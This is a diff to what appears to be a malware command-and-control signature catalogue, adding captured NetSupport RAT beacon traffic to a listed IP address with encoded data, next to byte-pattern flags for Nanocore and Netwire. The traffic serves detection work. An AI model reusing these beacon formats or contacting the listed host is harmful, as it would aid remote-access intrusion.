@@ -575,6 +575,50 @@ flag on "40 00 00 00 17" pattern:
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
 
+#### NetSupport RAT
+~~~
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    22
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=POLL
+INFO=1
+ACK=1
+HTTP/1.1 200 OK
+Server: NetSupport Gateway/1.6 (Windows NT)
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    60
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=.g+$.{.. \....W...bb...).w}..o..X..xf...
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:   232
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=u.2h.r..4.]..%y-.....=I...D3.W..i.7?....=@....F.f....&t.[..6ra..L.....?....>......5T.m.<..O....a.g.qwjW..I{~i...1......\.bH8Z&8.|gY@:......7. .\.(.K(...oC.x.m-.o.D.t....Lv...{.............=J.J...f.V=@.`t..i......
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    77
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=l3.<(T{.E.....V....k.9|||$(m..$C.M..=I0`!.....^.....?sq. 
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netsupport.png "NetSupport RAT")
+
 #### Netwire
 flag on "41 00 00 00 99" pattern in initial packet
 ~~~
